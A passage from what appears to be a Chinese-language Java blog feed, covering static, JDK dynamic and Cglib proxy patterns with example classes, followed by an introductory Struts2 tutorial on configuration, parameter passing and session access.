class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试类：StaticProxyTest.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StaticProxyTest</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">proxyTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//目标对象</span>        <span class="token class-name">RealSubject</span> subject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RealSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//代理对象</span>        <span class="token class-name">Proxy</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>subject<span class="token punctuation">)</span><span class="token punctuation">;</span>        proxy<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态代理总结"><a href="#静态代理总结" class="headerlink" title="静态代理总结"></a>静态代理总结</h3><ul><li>可以在不修改目标对象功能的前提下，对目标对象进行扩展。</li><li>缺点：因为代理对象需要与目标对象实现一样的接口，所以会有很多代理类，类太多。同时，一旦接口增加方法，目标对象与代理对象都要维护。</li></ul><p>如何解决静态代理中的缺点呢？答案是可以使用动态代理方式。</p><br>## JDK 动态代理动态代理中，代理类并不是在 Java 代码中实现，而是在运行时期生成，相比静态代理，动态代理可以很方便的对委托类的方法进行统一处理，动态代理分为 JDK 动态代理和 cglib 动态代理。下面先说说 JDK 动态代理。<p>使用 JDK 动态代理模式必须要让代理类和目标类实现相同的接口，客户端通过代理类来调用目标方法，代理类会将所有的方法调用分派到目标对象上反射执行，还可以在分派过程中添加“前置通知”和“后置通知”（如在调用目标方法前家教严权限，在调用完目标方法后打印日志等）等功能。<br><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fgbcvjspu1j20le0f60tb.jpg" alt="JDK 动态代理"></p><p>使用动态代理的五大步骤</p><ol><li>通过实现 InvocationHandler 接口来自定义自己的 InvocationHandler</li><li>通过 Proxy.getProxyClass 获得动态代理类</li><li>通过反射机制获得代理类的构造方法，方法签名为 getConstructor(InvocationHandler.class)</li><li>通过构造函数获得代理对象并将自定义的 InvocationHandler 实例对象作为参数传入</li><li>通过代理对象调用目标方法</li></ol><h3 id="代码示例：-1"><a href="#代码示例：-1" class="headerlink" title="代码示例："></a>代码示例：</h3><p>目标对象的接口：Subject.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>目标对象：RealSubject.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RealSubject</span> <span class="token keyword">implements</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自定义 InvocationHandler：MyInvocationHandler.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInvocationHandler</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Subject</span> subject<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">MyInvocationHandler</span><span class="token punctuation">(</span><span class="token class-name">Subject</span> subject<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subject <span class="token operator">=</span> subject<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"----------插入前置通知代码-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> rs <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>subject<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"----------插入前置通知代码-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> rs<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试类：DynamicProxyTest.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">proxyTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>    <span class="token comment">//生成 $Proxy 的 class 文件</span>    <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//获取动态代理类</span>    <span class="token class-name">Class</span> proxyClass <span class="token operator">=</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">getProxyClass</span><span class="token punctuation">(</span><span class="token class-name">Subject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Subject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//获得代理类的构造函数，并传入参数类型 InvocationHandler.class</span>    <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> proxyClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//通过构造函数来创建动态代理对象，将自定义的 InvocationHandler 实例传入</span>    <span class="token class-name">Subject</span> subject <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Subject</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyInvocationHandler</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RealSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//通过代理对象调用目标方法</span>    subject<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Proxy 类中还有个将 2~4 步骤封装好的简便方法来创建动态代理对象，其方法签名为：newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] instance, InvocationHandler h)，如下例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">proxyTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>    <span class="token comment">//生成 $Proxy 的 class 文件</span>    <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Subject</span> subject <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Subject</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Subject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//加载接口的类加载器</span>            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Subject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment">//一组接口</span>            <span class="token keyword">new</span> <span class="token class-name">MyInvocationHandler</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RealSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自定义的 InvocationHandler</span>    subject<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果一样。</p><p><strong>JDK 代理有以下特点：</strong></p><ul><li>代理对象，不需要实现接口</li><li>代理对象的生成，是利用 JDK 的 API 动态的在内存中构建代理对象（需要我们指定创建代理对象/目标对象实现的接口类型）</li><li>JDK 代理也叫做接口代理</li></ul><br><h2 id="Cglib-代理"><a href="#Cglib-代理" class="headerlink" title="Cglib 代理"></a>Cglib 代理</h2><p>上面的静态代理和 JDK 动态代理模式都要求目标对象实现一个接口，但是有时候目标对象只是一个单独的对象，并没有实现任何的接口，这个时候就可以使用以目标对象子类的方式类实现代理，这种方法就叫做：Cglib 代理</p><p>Cglib 代理也叫作子类代理，它是在内存中构建一个子类对象从而实现对目标对象功能的扩展。</p><ul><li>JDK 的动态代理有一个限制，就是使用动态代理的对象必须实现一个或多个接口，如果想代理没有实现接口的类，就可以使用 Cglib 实现。</li><li>Cglib 是一个强大的高性能的代码生成包，它可以在运行期扩展 Java 类与实现 Java 接口。它广泛的被许多 AOP 的框架使用，例如 Spring AOP 和 synaop，为他们提供方法的 interception（拦截）。</li><li>Cglib 包的底层是通过使用一个小而快的字节码处理框架 ASM 来转换字节码并生成新的类。不鼓励直接使用 ASM，因为它要求你必须对 JVM 内部结构包括 class 文件的格式和指令集都很熟悉。</li></ul><p><strong>Cglib 子类代理实现方法：</strong></p><ol><li>需要引入 Cglib 的 jar 文件，但是 Spring 的核心包中已经包括了 Cglib 功能，所以直接引入 <code>spring-core-x.x.x.jar</code> 即可。</li><li>引入依赖包后,就可以在内存中动态构建子类。</li><li>代理的类不能定义为 final，否则会报错。</li><li>目标对象的方法如果定义为 final 或 static，那么就不会被拦截，即不会执行目标对象额外的业务方法。</li></ol><h3 id="代码示例：-2"><a href="#代码示例：-2" class="headerlink" title="代码示例："></a>代码示例：</h3><p>目标对象：RealSubject.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RealSubject</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"目标对象的方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cglib 代理工厂：ProxyFactory.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProxyFactory</span> <span class="token keyword">implements</span> <span class="token class-name">MethodInterceptor</span> <span class="token punctuation">{</span>    <span class="token comment">//维护目标对象</span>    <span class="token keyword">private</span> <span class="token class-name">RealSubject</span> target<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ProxyFactory</span><span class="token punctuation">(</span><span class="token class-name">RealSubject</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>target <span class="token operator">=</span> target<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//给目标对象创建一个代理对象</span>    <span class="token keyword">public</span> <span class="token class-name">RealSubject</span> <span class="token function">getProxyInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//1.工具类</span>        <span class="token class-name">Enhancer</span> enhancer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Enhancer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.设置父类</span>        enhancer<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.设置回调函数</span>        enhancer<span class="token punctuation">.</span><span class="token function">setCallback</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.创建子类（代理对象）</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">RealSubject</span><span class="token punctuation">)</span> enhancer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">intercept</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objects<span class="token punctuation">,</span> <span class="token class-name">MethodProxy</span> methodProxy<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"---------前置通知代码---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//执行目标对象的方法</span>        <span class="token class-name">Object</span> returnValue <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> objects<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"---------后置通知代码---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> returnValue<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试类：CglibProxyTest.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CglibProxyTest</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//目标对象</span>        <span class="token class-name">RealSubject</span> target <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RealSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//代理对象</span>        <span class="token class-name">RealSubject</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RealSubject</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">ProxyFactory</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getProxyInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//执行代理对象的方法</span>        proxy<span class="token punctuation">.</span><span class="token function">doPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 Spring 的 AOP 编程中：<br>如果加入容器的目标对象有实现接口，用 JDK 代理。<br>如果目标对象没有实现接口，用 Cglib 代理。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> Proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>struts2</title>
      <link href="/2017/05/18/struts2/"/>
      <url>/2017/05/18/struts2/</url>
      
        <content type="html"><![CDATA[<p>Struts2 前身是 weborek 框架，优点是封装、重用、代码简洁、编码速度快、准确度高。</p><span id="more"></span><h2 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h2><p>Struts2 是个 Web MVC 框架</p><h3 id="MVC："><a href="#MVC：" class="headerlink" title="MVC："></a>MVC：</h3><ul><li>Controller 控制层<ul><li>DispatcherServlet 总控制器（继承 HttpServlet），分发请求。</li><li>XXXController 分控制器，接受请求数据、调用业务模型、页面跳转（转发重定向）。</li></ul></li><li>Model 业务模型层<ul><li>Service 业务逻辑，处理棘突业务逻辑的。</li><li>DAO（数据持久层）</li></ul></li><li>View 视图层<ul><li>呈现数据，用户交互</li></ul></li></ul><p>View → 发出请求 → 总控制器 → 分发请求 → 分控制器 → 接收数据 ←→ 调用 Service ←→ 调用 DAO （CRUD）→ DB<br>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;↓<br>                                    页面跳转</p><h2 id="Struts2-入门开发"><a href="#Struts2-入门开发" class="headerlink" title="Struts2 入门开发"></a><strong>Struts2 入门开发</strong></h2><p>首先要<a href="">下载 struets2 资源包</a>（jar 包、源码、示例代码）</p><ol><li><p>创建 web 项目</p></li><li><p>引入 jar 包 </p><ol><li>commons-fileupload 上传</li><li>commons-io 下载</li><li>commons-lang </li><li>freemarker 模板</li><li>javassist 改变字节码</li><li>ognl 一种表达式</li><li>struts2-core 核心包</li><li>xwork-core webwork 核心包</li></ol></li><li><p>配置 Struts2 的总控制器</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;filter&gt;&lt;filter-name&gt;StrutsFilter&lt;/filter-name&gt;&lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt;&lt;/filter&lt;filter-mapping&gt;&lt;filter-name&gt;StrutsFilter&lt;/filter-name&gt;&lt;!-- 默认后缀名为 .action 或者无后缀 --&gt;&lt;url-pattern&gt;/*&lt;url-pattern&gt;&lt;/filter-mapping&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写处理请求的 Action 类（分控制器）<strong>继承 ActionSupport 类</strong><br><strong>方法一定是无参的，并且返回 String 类型</strong> 返回的字符串和页面是一一对应的.</p></li><li><p>在类路径创建一个 <strong>struts.xml</strong> 文件<br>配置请求 url 地址和 Action 的对应关系</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">配置文件头从 struts2-core 包中拷贝 struts-default.xml 过来即可&lt;struts&gt;&lt;!-- 配置包name:包名extends:继承 --&gt;&lt;package name="com.crazybunqnq.action" extends="struts-default" namespace="/"&gt;&lt;!-- 配置 url 请求和哪个 Action 对应name:配置的请求 urlclass:action 类的全路径method:方法名，默认为 execute--&gt;&lt;action name="login" class="com.crazybunqnq.LoginAction" method="doLogin"&gt;&lt;!-- 配置 Action 类返回的结果对应的页面name:方法返回的字符串type:响应类型，默认为转发 "dispatcher"，改为 "redirect" 则变为重定向跳转，改为 redirectAction 则重定向到另一个 Action ...--&gt;&lt;result name="success"&gt;/main.jsp&lt;/result&gt;&lt;/action&gt;&lt;/package&gt;&lt;/struts&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h3><!--全局 result--><global-results>    <result name="error">/error.jsp</result></global-results><!--全局异常--><global-exception-mappings>    <exception-mapping result="error" exception="java.lang"></exception-mapping></global-exception-mappings><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>url-发出请求-  action-方法-result-jsp</p><h3 id="页面到-action-的传值和-action-到页面的传值"><a href="#页面到-action-的传值和-action-到页面的传值" class="headerlink" title="页面到 action 的传值和 action 到页面的传值"></a>页面到 action 的传值和 action 到页面的传值</h3><p>Action 中的属性与页面请求的参数名相同，并设置好 get 和 set 方法即可。</p><p>发送请求时会先获取请求参数值并调用 set 方法，再调用 action 的方法。</p><p>//底层请求参数 设置给 set 方法的形参，再给属性赋值</p><pre class="line-numbers language-none"><code class="language-none">http://...../login?name=xxx&amp;age=5&amp;interest=eat&amp;interest=play<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private String name;private int ageprivate String[] interest;private User user;public void setName(String name) {this.name = name;}public void setAge(int age){this.age = age;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>el 表达式 一次从 pageContext request action session application 中取值</p><p>表单中若要传递对象，则需要这样写：</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;input name="user.username"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="namespace-命名空间"><a href="#namespace-命名空间" class="headerlink" title="namespace 命名空间"></a>namespace 命名空间</h2><p>分门别类,区分不同包的同名请求，当多个 package 的 action 冲突的时候，可以根据 namespace 区分</p><pre class="line-numbers language-none"><code class="language-none">&lt;package name="com.crazybunqnq.action" extends="struts-default" namespace="/emp"&gt;&lt;/package&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>默认值是”/“，但不建议用默认值</p></blockquote><h2 id="struts2-访问-request-response-session"><a href="#struts2-访问-request-response-session" class="headerlink" title="struts2 访问 request response session"></a>struts2 访问 request response session</h2><ol><li><p>不推荐</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">//获取原始类型的 request 和 response 对象一次请求 一次响应期间HttpServletRequest request = ServletActionContext.getRequest();HttpServletRequest response = ServletActionContext.getResponse();//获取 sessionHttpSession session = request.getSession();//获取 Servlet 上下文，对于一个应用，它是唯一的ServletContext application = ServletActionContext.getServletContext();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ActionContext<br>返回 Map 类型的 request response session 对象</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Map&lt;String, Object&gt; request = (Map&lt;String, Object&gt;)ActionContext.getContext().get("request");Map&lt;String, Object&gt; session = ActionContext.getContext.getSession();Map&lt;String, Object&gt; application = (Map&lt;String, Object&gt;)ActionContext.getContext().getApplication();requset.put("r", "requset");session.put("s", "session");application.put("a", "application");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注入式(推荐)<br>以上两种访问方式都是侵入式编程<br>实现接口<br>Action … implements RequestAware,SessionAware,ApplicationAware<br>实现接口方法后，参数就是 request session application 对象</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private Map&lt;String , Object&gt; appliacation;setApplication(Map&lt;String, Object&gt; application) {this.application = application;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>推荐将获取 session 等对象封装到一个基类中，例如 BaseAction.java:</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class BaseAction extends ActionSupport implements RequestAware, SessionAware, ApplicationAware {protected Map&lt;String, Object&gt; appliacation;protected Map&lt;String, Object&gt; request;protected Map&lt;String, Object&gt; session;@Overridepublic void setApplication(Map&lt;String, Object&gt; appliacation) {this.application = application;}@Overridepublic void setApplication(Map&lt;String, Object&gt; request) {this.session = request;}@Overridepublic void setApplication(Map&lt;String, Object&gt; session) {this.session = session;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="result-type"><a href="#result-type" class="headerlink" title="result type"></a>result type</h2><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;result type="..."&gt;&lt;/result&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>result name 默认为 success<br>配置文件可以使用 el 表达式</p></blockquote><h3 id="dispatcher"><a href="#dispatcher" class="headerlink" title="dispatcher"></a>dispatcher</h3><p>转发到页面<br><result type="dispatcher"></result></p><h3 id="freemaker"><a href="#freemaker" class="headerlink" title="freemaker"></a>freemaker</h3><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><p>流响应，服务器发送给浏览器的是 流格式的数据(byet 序列)，可以用来下载</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;result name="success" type="stream"&gt;&lt;param name="inputName"&gt;is&lt;/parm&gt;&lt;!--contentDispositionattachment:保存 另存 提示inline ： 直接在浏览器打开【默认】--&gt;&lt;param 